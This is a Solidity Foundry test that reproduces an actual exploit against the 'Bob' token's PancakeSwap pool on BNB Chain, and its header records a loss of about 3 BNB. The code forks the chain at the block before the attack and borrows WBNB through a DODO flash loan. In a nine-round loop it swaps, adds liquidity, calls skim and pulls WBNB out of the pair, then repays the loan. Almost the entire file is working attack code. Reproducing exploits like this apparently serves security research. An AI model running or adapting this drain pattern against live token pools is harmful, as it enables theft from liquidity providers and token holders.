// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";

// @KeyInfo - Total Lost : ~3BNB
// Attacker : https://bscscan.com/address/0xcb733f075ae67a83a9c5f38a0864596e338a0106
// Attack Contract : https://bscscan.com/address/0x0fe1983b8972630c866fe77ad873a66ec598b685
// Vulnerable Contract : https://bscscan.com/address/0x10ed43c718714eb63d5aa57b78b54704e256024e
// Attack Tx : https://bscscan.com/tx/0xfb14292a531411f852993e5a3ba4e7eb63ed548220267b9b3f4aacc5572d3a58

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x10ed43c718714eb63d5aa57b78b54704e256024e#code

// @Analysis
// Post-mortem : 
// Twitter Guy : 
// Hacking God : 
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "./../interface.sol";

contract Bob is BaseTestWithBalanceLog {
    IERC20 HackDao = IERC20(0x94e06c77b02Ade8341489Ab9A23451F68c13eC1C);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    Uni_Pair_V2 Pair1 = Uni_Pair_V2(0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2); // HackDao WBNB
    Uni_Pair_V2 Pair2 = Uni_Pair_V2(0xbdB426A2FC2584c2D43dba5A7aB11763DFAe0225); //HackDao USDT
    address router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    Uni_Router_V2 Router = Uni_Router_V2(router);
    address dodo = 0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d;

    IERC20 Bob = IERC20(0x700eE24c350739e323Dcf6A50Ae3E7A3329C86aE);

    Uni_Pair_V2 cakeLP = Uni_Pair_V2(0x7CafdAaa0ba0F471c800DBaca94bDB943311939d);

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 34428628-1);
    }

    function testExploit() public {
        // WBNB.approve(address(Router), type(uint256).max);
        // HackDao.approve(address(Router), type(uint256).max);
        DVM(dodo).flashLoan(100 * 1e18, 0, address(this), "0x00");

        emit log_named_decimal_uint("[End] Attacker BNB balance after exploit",WBNB.balanceOf(address(this)), 18);
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) public {
        WBNB.approve(address(Router), type(uint256).max);
        Bob.approve(address(Router), type(uint256).max);
        cakeLP.approve(address(Router), type(uint256).max);

        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(Bob);

        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            20000000000000, 0, path, address(this), block.timestamp
        );

        (uint112 reserve0, uint112 reserve1, uint32 timestamp) = cakeLP.getReserves();
        uint bob_balance = Bob.balanceOf(address(this));
        uint amount_b = Router.quote(bob_balance, reserve0, reserve1);
        WBNB.transfer(address(cakeLP), amount_b);
        Bob.transfer(address(cakeLP), bob_balance);
        cakeLP.mint(address(this));

        int index = 0;
        while (index < 9) {
            Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                WBNB.balanceOf(address(this)), 0, path, address(this), block.timestamp
            );

            Bob.transfer(address(cakeLP), Bob.balanceOf(address(this)));
            cakeLP.skim(address(cakeLP));
            (uint112 reserve0, uint112 reserve1, uint32 timestamp) = cakeLP.getReserves();
            uint bob_balance = Bob.balanceOf(address(cakeLP));
            uint256 amountOut = Router.getAmountOut(96 * bob_balance / 100, reserve0, reserve1);
            cakeLP.swap(0, amountOut, address(this), abi.encode("0x00"));

            address[] memory path = new address[](2);
            path[0] = address(WBNB);
            path[1] = address(Bob);

            Router.swapTokensForExactTokens(90 * bob_balance / 100, WBNB.balanceOf(address(this)), path, router, block.timestamp);
            Router.removeLiquidityETHSupportingFeeOnTransferTokens(
                address(Bob), 1000000000000000000, 1, 1, address(this), block.timestamp
            );

            address[] memory path_reverse = new address[](2);
            path_reverse[0] = address(Bob);
            path_reverse[1] = address(WBNB);
            Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                Bob.balanceOf(address(this)), 0, path_reverse, address(this), block.timestamp
            );
            index++;
        }

        WBNB.transfer(dodo, 100 * 1e18);
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        return;
    }
    
    fallback() external payable {}

}
